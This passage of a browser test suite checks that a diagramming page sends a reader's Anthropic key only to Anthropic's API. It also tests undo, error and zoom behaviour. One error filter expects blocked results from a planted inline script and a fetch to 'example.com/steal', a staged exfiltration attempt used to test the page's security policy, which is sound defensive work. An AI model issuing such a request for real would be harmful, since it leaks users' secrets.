    assert.equal(await page.evaluate(() => [sessionStorage.getItem("j2s-anthropic-key"), localStorage.getItem("j2s-anthropic-key")].join("|")), FAKE_KEY + "|", "kept for the tab only");
    const mine = sent.slice(before);
    const withKey = mine.filter((r) => JSON.stringify(r).includes(FAKE_KEY.slice(20)));
    assert.equal(withKey.length, 1, "the key went out once");
    assert.equal(new URL(withKey[0].url).origin, "https://api.anthropic.com");
    assert.equal(withKey[0].headers["x-api-key"], FAKE_KEY);
    assert.equal(withKey[0].headers["anthropic-dangerous-direct-browser-access"], "true");
    assert.ok(!withKey[0].body.includes(FAKE_KEY.slice(20)), "never in a body");
    const text = await page.evaluate(() => document.documentElement.outerHTML);
    assert.ok(!text.includes("HAIKU-SAID-THIS"), "words Haiku sent beside the drawing are never shown");
    assert.ok(!text.includes(FAKE_KEY.slice(20)), "the key is nowhere in the page");
    assert.match(await bar(1).locator(".db-said").innerText(), /users hit an ALB/);
    assert.match(await bar(1).locator(".db-haiku-note").innerText(), /Drawn\./);
    await shot(1, "h2-drawn.png");
  });

  await check("the request carries the board and the reader's words, and not one sentence of the exercise", async () => {
    const req = sent.filter((r) => r.url.startsWith("https://api.anthropic.com")).at(-1);
    const body = JSON.parse(req.body);
    assert.equal(body.model, "claude-haiku-4-5");
    assert.deepEqual(body.tool_choice, { type: "tool", name: "draw" });
    assert.ok(body.messages[0].content.includes(H["p1-alb-ecs-rds"].ask));
    // Every exercise on the page, as the page itself carries it: six words in
    // a row from any of it, anywhere in what was sent, is a leak.
    // Read from the page as shipped: a mounted board replaces its own data
    // block, so the live DOM no longer holds it (the first version of this
    // check found 0 words to look for, and the size guard below said so).
    const exercises = await page.evaluate(async () => {
      const doc = new DOMParser().parseFromString(await (await fetch(location.href)).text(), "text/html");
      return [...doc.querySelectorAll(".designboard script[type='application/json']")].map((s) => s.textContent);
    });
    assert.equal(exercises.length, 4);
    const words = (t) => String(t).toLowerCase().replace(/[^a-z0-9]+/g, " ").trim().split(" ").filter(Boolean);
    const windows = new Set();
    for (const raw of exercises) (function walk(v) { if (typeof v === "string") { const w = words(v); for (let i = 0; i + 6 <= w.length; i++) windows.add(w.slice(i, i + 6).join(" ")); } else if (v && typeof v === "object") Object.values(v).forEach(walk); })(JSON.parse(raw));
    assert.ok(windows.size > 300, `only ${windows.size} windows of exercise text`);
    const sentWords = words(req.body), sentWindows = new Set();
    for (let i = 0; i + 6 <= sentWords.length; i++) sentWindows.add(sentWords.slice(i, i + 6).join(" "));
    assert.deepEqual([...windows].filter((w) => sentWindows.has(w)), []);
  });

  await check("the checks read Haiku's drawing like any other, and Ctrl+Z puts back the empty board in one step", async () => {
    await B(1).locator('[data-act="check"]').click();
    assert.equal(await B(1).locator('.db-check[data-check="spread"] .st-pass').count(), 1, "two ECS copies behind an ALB are two copies");
    await B(1).locator(".db-stage").focus();
    await page.keyboard.press("Control+z");
    assert.equal((await state(1)).nodes.length, 0, "one undo step for the whole drawing");
    await page.keyboard.press("Control+Shift+z");
    assert.equal((await state(1)).nodes.length, 5);
  });

  await check("'i meant a cache, not a database' swaps that one part, keeps its arrows, and moves nothing else", async () => {
    const before = await state(1);
    anthropic = reply(answer(H["p2-meant-cache"].input));
    await ask(1, H["p2-meant-cache"].ask);
    await idle(1);
    const after = await state(1);
    const was = before.nodes.find((n) => n.id === "rds1"), now = after.nodes.find((n) => n.id === "rds1");
    assert.equal(was.part, "rds"); assert.equal(now.part, "elasticache");
    for (const n of before.nodes) if (n.id !== "rds1") assert.deepEqual([after.nodes.find((m) => m.id === n.id).x, after.nodes.find((m) => m.id === n.id).y], [n.x, n.y], `${n.id} moved`);
    assert.deepEqual(after.edges, before.edges);
    // The earlier ask went with it, so Haiku knew what "a database" meant.
    const body = JSON.parse(sent.filter((r) => r.url.startsWith("https://api.anthropic.com")).at(-1).body);
    assert.match(body.messages[0].content, /asked for before[\s\S]*users hit an ALB/);
    assert.match(body.messages[0].content, /"id":"rds1","part":"rds"/);
    await shot(1, "h3-edit.png");
  });

  await check("a key Anthropic refuses is forgotten, said so plainly, and the panel asks again", async () => {
    anthropic = reply({ type: "error", error: { type: "authentication_error", message: "invalid x-api-key" } }, 401);
    const before = await state(1);
    await ask(1, "add a queue");
    await idle(1);
    assert.match(await bar(1).locator(".db-haiku-note").innerText(), /did not accept that key/);
    assert.equal(await bar(1).locator(".db-keypanel").isVisible(), true);
    assert.equal(await page.evaluate(() => sessionStorage.getItem("j2s-anthropic-key")), null);
    assert.deepEqual(await state(1), before, "a failed drawing changes nothing");
    await page.keyboard.press("Escape");
  });

  await check("Remember keeps the key on this device, Forget clears it from both places", async () => {
    await bar(1).locator('[data-act="key"]').click();
    await bar(1).locator(".db-key-in").fill(FAKE_KEY);
    await bar(1).locator(".db-key-remember").check();
    await bar(1).locator('[data-act="key-save"]').click();
    assert.deepEqual(await page.evaluate(() => [sessionStorage.getItem("j2s-anthropic-key"), localStorage.getItem("j2s-anthropic-key")]), [null, FAKE_KEY]);
    await page.reload({ waitUntil: "load" });
    assert.equal(await page.evaluate(() => localStorage.getItem("j2s-anthropic-key")), FAKE_KEY, "remembered across a reload");
    await bar(1).locator('[data-act="key"]').click();
    await bar(1).locator('[data-act="key-forget"]').click();
    assert.deepEqual(await page.evaluate(() => [sessionStorage.getItem("j2s-anthropic-key"), localStorage.getItem("j2s-anthropic-key")]), [null, null]);
    await page.evaluate((k) => sessionStorage.setItem("j2s-anthropic-key", k), FAKE_KEY);
  });

  await check("Stop ends a drawing that is taking too long, and nothing changes", async () => {
    await page.addStyleTag({ content: ".reading-bar{position:static!important}html{scroll-behavior:auto!important}.read-progress{display:none!important}" });
    const before = await state(1);
    anthropic = reply(answer(H["p3-serverless"].input), 200, 4000);
    await ask(1, H["p3-serverless"].ask);
    await page.waitForTimeout(300);
    assert.equal(await B(1).evaluate((b) => b.classList.contains("is-drawing")), true);
    assert.equal(await bar(1).locator(".db-haiku-in").isDisabled(), true);
    await bar(1).locator('[data-act="draw"]').click();                 // it reads Stop now
    await idle(1);
    assert.equal(await bar(1).locator(".db-haiku-note").innerText(), "Stopped.");
    assert.deepEqual(await state(1), before);
    await page.waitForTimeout(4200);                                    // the answer arrives late, and is ignored
    assert.deepEqual(await state(1), before);
  });

  await check("a model that refuses forced tool use is asked again with auto, and still only draws", async () => {
    let n = 0;
    anthropic = async (route) => (++n === 1
      ? reply({ type: "error", error: { type: "invalid_request_error", message: "tool_choice: forced tool use is not supported for this model" } }, 400)(route)
      : reply(answer(H["p5-mistake"].input))(route));
    const before = sent.length;
    await ask(1, H["p5-mistake"].ask);
    await idle(1);
    const calls = sent.slice(before).filter((r) => r.url.startsWith("https://api.anthropic.com") && r.body).map((r) => JSON.parse(r.body).tool_choice.type);
    assert.deepEqual(calls, ["tool", "auto"]);
    assert.deepEqual((await state(1)).nodes.map((n) => n.part).sort(), ["apigw", "rds", "sqs"], "the queue that writes to Postgres is drawn as said, mistake and all");
    await B(1).locator('[data-act="check"]').click();
    assert.equal(await B(1).locator('.db-check[data-check="arrows"] .st-fail').count(), 1, "and the checks, not Haiku, are what say so");
  });

  await check("a drawing too big for the board zooms it out instead of squeezing it, and still drags where it is dropped", async () => {
    const before = await state(1), tall = (await B(1).locator(".db-svg").boundingBox()).height;
    anthropic = reply(answer(H["q5-rename"].input));
    await ask(1, H["q5-rename"].ask);
    await idle(1);
    const s = await state(1);
    assert.ok(s.canvas && s.canvas.w > 860, JSON.stringify(s.canvas));
    assert.equal(await B(1).locator(".db-svg").getAttribute("viewBox"), `0 0 ${s.canvas.w} ${s.canvas.h}`);
    assert.ok(Math.abs((await B(1).locator(".db-svg").boundingBox()).height - tall) < 2, "the board keeps its height on the page");
    assert.match(await bar(1).locator(".db-haiku-note").innerText(), /zoomed out/);
    for (const n of s.nodes) assert.ok(n.x > 0 && n.x < s.canvas.w && n.y > 0 && n.y < s.canvas.h, `${n.id} on the canvas`);
    await shot(1, "h4-zoomed.png");
    // A drag on the zoomed board lands where the pointer lets go.
    const n = s.nodes.find((x) => x.part === "cloudfront");
    const from = await at(1, n.x, n.y), to = await at(1, n.x + 40, n.y + 60);
    await drag(from, to);
    const moved = (await state(1)).nodes.find((x) => x.id === n.id);
    assert.ok(Math.abs(moved.x - (n.x + 40)) <= 4 && Math.abs(moved.y - (n.y + 60)) <= 4, `${JSON.stringify(moved)} vs ${n.x + 40},${n.y + 60}`);
    await B(1).locator(".db-stage").focus();
    await page.keyboard.press("Control+z");
    await page.keyboard.press("Control+z");
    assert.deepEqual(await state(1), before, "two undos: the drag, then the whole drawing and its zoom");
    assert.equal(await B(1).locator(".db-svg").getAttribute("viewBox"), "0 0 860 540");
  });

  await check("the bar steps aside in break it, and comes back", async () => {
    await B(1).locator('[data-act="break"]').click();
    assert.equal(await bar(1).isVisible(), false);
    await B(1).locator('[data-act="break"]').click();
    assert.equal(await bar(1).isVisible(), true);
    anthropic = null;
  });

  // The one check that reaches the real model, and only when asked to:
  // DESIGNBOARD_HAIKU_KEY=<an Anthropic key> draws for real on whichever site
  // this runs against. Never in CI; the key is typed into the page like a
  // reader's, and nothing here writes it anywhere.
  if (process.env.DESIGNBOARD_HAIKU_KEY) await check("Haiku, for real: a drawing and an edit from the live model", async () => {
    await page.unroute("https://api.anthropic.com/**");
    await page.evaluate(() => { sessionStorage.clear(); localStorage.clear(); });
    await page.reload({ waitUntil: "load" });
    await page.addStyleTag({ content: ".reading-bar{position:static!important}html{scroll-behavior:auto!important}.read-progress{display:none!important}" });
    await ask(1, "users hit an ALB in front of two ECS services in two zones, which read an RDS database");
    await bar(1).locator(".db-key-in").fill(process.env.DESIGNBOARD_HAIKU_KEY);
    await bar(1).locator('[data-act="key-save"]').click();
    await idle(1);
    assert.match(await bar(1).locator(".db-haiku-note").innerText(), /Drawn/, await bar(1).locator(".db-haiku-note").innerText());
    assert.ok((await state(1)).nodes.some((n) => n.part === "rds"));
    await shot(1, "live-1-drawn.png");
    await ask(1, "oh no, i meant a cache, not a database");
    await idle(1);
    const s = await state(1);
    assert.ok(s.nodes.some((n) => n.part === "elasticache") && !s.nodes.some((n) => n.part === "rds"), JSON.stringify(s.nodes.map((n) => n.part)));
    await shot(1, "live-2-edit.png");
    assert.deepEqual(await page.evaluate(() => window.__csp), [], "the real call breaks nothing in the policy");
    await page.evaluate(() => { sessionStorage.clear(); localStorage.clear(); });
  });

  await check("no page errors, and nothing refused by the page's policy", async () => {
    // The refusals the checks above provoke on purpose (a 400 and a 401 from
    // Anthropic, a planted script, a request to another site) are expected;
    // window.__csp still has to be empty, so a real refusal cannot hide here.
    const provoked = /api\.anthropic\.com|status of 40[01]\b|^Executing inline script violates|^Fetch API cannot load https:\/\/example\.com\/steal/;
    assert.deepEqual(errors.filter((e) => !provoked.test(e)), []);
    assert.deepEqual(await page.evaluate(() => window.__csp), []);
  });

  await check("a phone gets the reference sketches and no board", async () => {
    const phone = await browser.newContext({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true });
    const p2 = await phone.newPage();
    await p2.goto(PAGE, { waitUntil: "load" });
    await p2.waitForTimeout(600);
    assert.equal(await p2.locator(".db").count(), 0);
    assert.equal(await p2.locator("details.db-reference[open]").count(), 4);
    await phone.close();
  });
} finally {
  if (browser) await browser.close();
  if (server) server.kill();
  for (const [status, name, ms, why] of results) console.log(`${status.padEnd(4)} ${name}  (${ms} ms)${why ? "\n       " + why : ""}`);
  console.log(`screenshots: ${shots}`);
  process.exitCode = results.some((r) => r[0] !== "ok") ? 1 : 0;
}
